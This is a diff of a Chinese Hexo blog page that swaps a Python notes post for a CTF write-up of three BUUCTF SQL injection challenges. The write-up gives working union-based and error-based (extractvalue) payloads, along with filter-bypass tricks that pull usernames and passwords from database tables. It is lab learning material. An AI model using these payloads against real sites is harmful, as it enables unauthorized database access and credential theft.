@@ -20,24 +20,29 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="斐波那契函数在——上补充代码，输出100以内的斐波那契数 1234a,b&#x3D;0,1while a&lt;&#x3D;100:    print(a,end&#x3D;&amp;#x27;,&amp;#x27;)    ------ 答案：a,b&#x3D;b+a,a 试着思考相同结构能否用c语言实现 12345678910int main()&amp;#123;    int a&#x3D;0,b&#x3D;1;    while(a&lt;&#x3D;100)    &amp;#123;">
+  <meta name="description" content="经过一段时间的学习,开始刷题之旅,题目都来自BUUCTF平台大致分为简单,签到,中等三个等级(困难的还做不出~~~),每道题写个wp 简单难度[极客大挑战 2019]LoveSQL进入靶机很容易发现是SQL注入两个传参为?username&amp;password尝试丢单引号,发现报错,确定为注入点丢个%23(#)进去,报错消失,证明为单引号闭合常规group by爆出3列常规union注入,发现">
 <meta property="og:type" content="article">
-<meta property="og:title" content="python练习题">
-<meta property="og:url" content="http://example.com/2023/03/13/python%E7%BB%83%E4%B9%A0%E9%A2%98/index.html">
+<meta property="og:title" content="buu刷题之sql注入">
+<meta property="og:url" content="http://example.com/2023/05/23/buu%E5%88%B7%E9%A2%98%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="睡猫的博客">
-<meta property="og:description" content="斐波那契函数在——上补充代码，输出100以内的斐波那契数 1234a,b&#x3D;0,1while a&lt;&#x3D;100:    print(a,end&#x3D;&amp;#x27;,&amp;#x27;)    ------ 答案：a,b&#x3D;b+a,a 试着思考相同结构能否用c语言实现 12345678910int main()&amp;#123;    int a&#x3D;0,b&#x3D;1;    while(a&lt;&#x3D;100)    &amp;#123;">
+<meta property="og:description" content="经过一段时间的学习,开始刷题之旅,题目都来自BUUCTF平台大致分为简单,签到,中等三个等级(困难的还做不出~~~),每道题写个wp 简单难度[极客大挑战 2019]LoveSQL进入靶机很容易发现是SQL注入两个传参为?username&amp;password尝试丢单引号,发现报错,确定为注入点丢个%23(#)进去,报错消失,证明为单引号闭合常规group by爆出3列常规union注入,发现">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230313213146.png">
-<meta property="og:image" content="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230313215009.png">
-<meta property="og:image" content="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230317151959.png">
-<meta property="article:published_time" content="2023-03-13T12:49:42.000Z">
-<meta property="article:modified_time" content="2023-03-17T08:21:26.139Z">
+<meta property="og:image" content="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523201418.png">
+<meta property="og:image" content="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523201708.png">
+<meta property="og:image" content="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523202045.png">
+<meta property="og:image" content="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523205904.png">
+<meta property="og:image" content="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523210205.png">
+<meta property="og:image" content="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523210905.png">
+<meta property="og:image" content="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523212047.png">
+<meta property="article:published_time" content="2023-05-23T11:55:27.000Z">
+<meta property="article:modified_time" content="2023-05-23T14:02:21.929Z">
 <meta property="article:author" content="？？喵！！">
-<meta property="article:tag" content="Python">
+<meta property="article:tag" content="SQL">
+<meta property="article:tag" content="BuuCTF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230313213146.png">
+<meta name="twitter:image" content="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523201418.png">
 
-<link rel="canonical" href="http://example.com/2023/03/13/python%E7%BB%83%E4%B9%A0%E9%A2%98/">
+<link rel="canonical" href="http://example.com/2023/05/23/buu%E5%88%B7%E9%A2%98%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/">
 
 
 <script id="page-configurations">
@@ -50,7 +55,7 @@
   };
 </script>
 
-  <title>python练习题 | 睡猫的博客</title>
+  <title>buu刷题之sql注入 | 睡猫的博客</title>
   
 
 
@@ -194,7 +199,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/13/python%E7%BB%83%E4%B9%A0%E9%A2%98/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/23/buu%E5%88%B7%E9%A2%98%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/hearder.jpg">
@@ -207,7 +212,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          python练习题
+          buu刷题之sql注入
         </h1>
 
         <div class="post-meta">
@@ -216,23 +221,17 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2023-03-13 20:49:42" itemprop="dateCreated datePublished" datetime="2023-03-13T20:49:42+08:00">2023-03-13</time>
+              <time title="创建时间：2023-05-23 19:55:27 / 修改时间：22:02:21" itemprop="dateCreated datePublished" datetime="2023-05-23T19:55:27+08:00">2023-05-23</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-03-17 16:21:26" itemprop="dateModified" datetime="2023-03-17T16:21:26+08:00">2023-03-17</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Python/" itemprop="url" rel="index"><span itemprop="name">Python</span></a>
+                  <a href="/categories/BuuCTF%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">BuuCTF刷题</span></a>
                 </span>
             </span>
 
@@ -249,14 +248,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>882</span>
+              <span>1.8k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
+              <span>6 分钟</span>
             </span>
 
         </div>
@@ -268,23 +267,18 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="斐波那契函数"><a href="#斐波那契函数" class="headerlink" title="斐波那契函数"></a>斐波那契函数</h2><p>在——上补充代码，输出100以内的斐波那契数</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a,b=<span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> a&lt;=<span class="number">100</span>:</span><br><span class="line">    <span class="built_in">print</span>(a,end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    ------</span><br></pre></td></tr></table></figure>
-<p>答案：<br><code>a,b=b+a,a</code></p>
-<p>试着思考相同结构能否用c语言实现</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">0</span>,b=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(a&lt;=<span class="number">100</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,a);</span><br><span class="line">        ------</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>想了许久没有想出答案，在python的赋值中<code>a,b=b+a,a</code>,a和b的赋值是同时进行的，但是在c语言中似乎无法用同时赋值，必须引用一个新的变量</p>
-<h2 id="jieba库"><a href="#jieba库" class="headerlink" title="jieba库"></a>jieba库</h2><p>常用函数jieba.lcut(s)   精确模式，返回一个列表类型。作用：分词,按中文逻辑切片</p>
-<h2 id="eval-函数"><a href="#eval-函数" class="headerlink" title="eval()函数"></a>eval()函数</h2><p>把字符串形式的结果保留原本的东西，在进行正常的运算</p>
-<h2 id="unicode编码"><a href="#unicode编码" class="headerlink" title="unicode编码"></a>unicode编码</h2><p>ord()参数是一个字符，不能是字符串，返回该字符对应的Unicode码<br>chr()的作用是：输入一个十进制或十六进制数字，返回其在Unicode编码中对应的文字或符号</p>
-<h2 id="format格式化输出"><a href="#format格式化输出" class="headerlink" title="format格式化输出"></a>format格式化输出</h2><p>语法<code>print(&quot;&#123;参数&#125;&quot;.format(内容))</code><br>参数格式：冒填齐宽逗点类<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230313213146.png"></p>
-<h2 id="列表切片：列表名-索引值-索引值-步长"><a href="#列表切片：列表名-索引值-索引值-步长" class="headerlink" title="列表切片：列表名[索引值:索引值:步长]"></a>列表切片：列表名[索引值:索引值:步长]</h2><p>索引值省略默认为起始值或终止值</p>
-<h2 id="random库（随机）"><a href="#random库（随机）" class="headerlink" title="random库（随机）"></a>random库（随机）</h2><p><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230313215009.png"></p>
-<h2 id="len-函数"><a href="#len-函数" class="headerlink" title="len()函数"></a>len()函数</h2><p>计算字符长度<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230317151959.png"></p>
-<h2 id="str-split-方法"><a href="#str-split-方法" class="headerlink" title="str.split()方法"></a>str.split()方法</h2><p>split(‘分割符’,num)   用指定分隔符对字符串切片，分割成num+1个字符串（切num刀）。<br>返回值是num+1个列表<br>可以省略，默认以空格全切</p>
-<h2 id="pow-函数"><a href="#pow-函数" class="headerlink" title="pow()函数"></a>pow()函数</h2><p>pow(x,y,z)   x底数，y指数，z取余字数<br>只有xy的情况下返回值是x的y次方<br>有z的情况下返回值是pow(x,y)的结果对z求余</p>
-<h2 id="print"><a href="#print" class="headerlink" title="print()"></a>print()</h2><p>print输出后自动换行<br>可以用print(,end&#x3D;’结尾符’)改变结尾</p>
-<h2 id="complex-函数"><a href="#complex-函数" class="headerlink" title="complex()函数"></a>complex()函数</h2><p>complex是python中的复数类型，以类似5+6j的形式表达<br>complex函数用于创建一个复数或者将一个字符串转化为复数形式</p>
+        <p>经过一段时间的学习,开始刷题之旅,题目都来自<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">BUUCTF平台</a><br>大致分为<code>简单</code>,<code>签到</code>,<code>中等</code>三个等级(困难的还做不出~~~),每道题写个<code>wp</code></p>
+<h1 id="简单难度"><a href="#简单难度" class="headerlink" title="简单难度"></a>简单难度</h1><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523201418.png"><br>进入靶机很容易发现是SQL注入<br>两个传参为<code>?username&amp;password</code><br>尝试丢单引号,发现报错,确定为注入点<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523201708.png"><br>丢个%23(#)进去,报错消失,证明为单引号闭合<br>常规<code>group by</code>爆出3列<br>常规union注入,发现有回显!<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523202045.png"><br>无过滤,有回显,直接走流程<br><strong>pyload</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span>admin<span class="string">&#x27;union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523205904.png"><br>进入靶机,提示有过滤<br>丢单引号,尝试丢单引号,发现报错,确定为注入点,丢个%23(#)进去,报错消失,证明为单引号闭合<br>常规<code>group by</code>发现报错<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523210205.png"><br>提示表明错误发生在<code>3#</code>附近,猜测是<code>by</code>被替换为空了,尝试双写绕过,成功!(3列)<br>这边心急直接丢进去查表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
+<p><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523210905.png"><br>这个报错非常明显了,也是替换成空格,对比payload和报错信息,少掉的部分就是被过滤的<br>过滤的关键词有<code>union</code>,<code>select</code>,<code>from</code>,<code>or</code>,<code>where</code>,<code>from</code>,<code>and</code><br>其他非常常规的走流程<br><strong>payload</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="string">&#x27;uniunionon selselectect 1,2,group_concat(id,username,passwoorrd) frfromom b4bsql%23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>和前两题是一样的,找到注入点,判断单引号闭合<br>丢入<code>group by 3</code>时,提示<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523212047.png"><br>明显是有东西触发过滤了(被发现了)<br>尝试写成<code>group b</code>,还是不行<br>尝试写成<code>grou b</code>,还是不行<br>单传一个空格,发现还是被逮住了,看来是过滤了空格,那我们直接<a target="_blank" rel="noopener" href="https://shuimao.xyz/2023/03/31/SQL%E6%B3%A8%E5%85%A52-0/#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87">上连接</a><br>找到一个<code>%A0</code>可以代替空格且没有过滤!<br>那尝试union注入,结果发现,union被过滤了…<br>那就直接上报错注入(无空格版)<br><code>and(1=extractvalue(100,concat(0x7e,(插入以下语句))))</code><br>还是被逮住,可能是and被过滤,删掉and,还是被逮住,可能是<code>=</code>被过滤<br>感觉出题人故意留了个后面一样…..<code>or</code>没有被过滤,其实想想也可以知道,要是<code>or</code>被过滤了,那<code>information_schema</code>也用不了<br>那就<code>?username=admin&amp;password=admin&#39;or(extractvalue(100,concat(0x7e,(database()))))%23</code>成功爆出<br>上payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or(extractvalue(100,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))))))%23</span></span><br></pre></td></tr></table></figure>
+<p>这里要知道<code>a=b</code>可以用<code>(a)like(b)</code>绕过<br>前面都还常规,逐渐报表名,爆列名,到最后一步<br><code>&#39;or(extractvalue(100,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)))))%23</code><br>得到<code>~1flagflag&#123;1669770e-dd70-4617-9f</code>,flag出来了一半,因为报错注入的字数是有限制的<br>尝试使用<br><code>select(substring(group_concat(password),1,30))from(H4rDsq1)</code><br>居然还是被逮住了,看来是过滤了<code>substring</code>,那就<a target="_blank" rel="noopener" href="https://shuimao.xyz/2023/03/31/SQL%E6%B3%A8%E5%85%A52-0/#substring%E8%BF%87%E6%BB%A4">上链接</a><br>使用<code>right</code>代替<code>substring</code><br>另一半flag出来的payload:<br><code>&#39;or(extractvalue(100,concat(0x7e,(select(right(password,30))from(H4rDsq1)))))%23</code></p>
 
     </div>
 
@@ -294,7 +288,8 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/Python/" rel="tag"># Python</a>
+              <a href="/tags/SQL/" rel="tag"># SQL</a>
+              <a href="/tags/BuuCTF/" rel="tag"># BuuCTF</a>
           </div>
 
         
@@ -303,13 +298,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2023/03/11/%E8%AF%95%E4%B8%80%E4%B8%8B%E5%9B%BE%E7%89%87%E7%9A%84%E4%B8%8A%E4%BC%A0/" rel="prev" title="试一下图片的上传">
-      <i class="fa fa-chevron-left"></i> 试一下图片的上传
+    <a href="/2023/05/09/SSTI%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/" rel="prev" title="SSTI注入的学习">
+      <i class="fa fa-chevron-left"></i> SSTI注入的学习
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2023/03/13/PHP%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/" rel="next" title="PHP语言的学习">
-      PHP语言的学习 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -368,7 +360,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E5%87%BD%E6%95%B0"><span class="nav-number">1.</span> <span class="nav-text">斐波那契函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jieba%E5%BA%93"><span class="nav-number">2.</span> <span class="nav-text">jieba库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eval-%E5%87%BD%E6%95%B0"><span class="nav-number">3.</span> <span class="nav-text">eval()函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unicode%E7%BC%96%E7%A0%81"><span class="nav-number">4.</span> <span class="nav-text">unicode编码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#format%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA"><span class="nav-number">5.</span> <span class="nav-text">format格式化输出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%97%E8%A1%A8%E5%88%87%E7%89%87%EF%BC%9A%E5%88%97%E8%A1%A8%E5%90%8D-%E7%B4%A2%E5%BC%95%E5%80%BC-%E7%B4%A2%E5%BC%95%E5%80%BC-%E6%AD%A5%E9%95%BF"><span class="nav-number">6.</span> <span class="nav-text">列表切片：列表名[索引值:索引值:步长]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#random%E5%BA%93%EF%BC%88%E9%9A%8F%E6%9C%BA%EF%BC%89"><span class="nav-number">7.</span> <span class="nav-text">random库（随机）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#len-%E5%87%BD%E6%95%B0"><span class="nav-number">8.</span> <span class="nav-text">len()函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#str-split-%E6%96%B9%E6%B3%95"><span class="nav-number">9.</span> <span class="nav-text">str.split()方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pow-%E5%87%BD%E6%95%B0"><span class="nav-number">10.</span> <span class="nav-text">pow()函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#print"><span class="nav-number">11.</span> <span class="nav-text">print()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#complex-%E5%87%BD%E6%95%B0"><span class="nav-number">12.</span> <span class="nav-text">complex()函数</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E9%9A%BE%E5%BA%A6"><span class="nav-number">1.</span> <span class="nav-text">简单难度</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="nav-number">1.1.</span> <span class="nav-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL"><span class="nav-number">1.2.</span> <span class="nav-text">[极客大挑战 2019]BabySQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL"><span class="nav-number">1.3.</span> <span class="nav-text">[极客大挑战 2019]HardSQL</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
